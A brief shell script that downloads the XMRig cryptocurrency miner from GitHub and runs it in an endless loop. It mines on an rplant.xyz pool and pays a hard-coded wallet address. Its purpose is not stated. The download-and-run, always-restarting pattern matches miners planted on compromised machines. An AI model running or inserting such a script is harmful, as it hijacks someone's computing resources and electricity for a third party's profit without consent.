#!/bin/sh
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz" > xmrig-6.18.1-linux-x64.tar.gz
tar -xvf xmrig-6.18.1-linux-x64.tar.gz
cd xmrig-6.18.1
while [ 1 ]; do
	./xmrig -a randomx --url randomx.rplant.xyz:17080 --tls --user 49nmaVXZEktSm7EKsgKjzeCbtAMa1LF9FfMTioPYxmRGaJovg2ojedmZ2w6hLPms7XFUEBzQe8FabFV391cEXv8NV2Ln4yD
	sleep 5
done
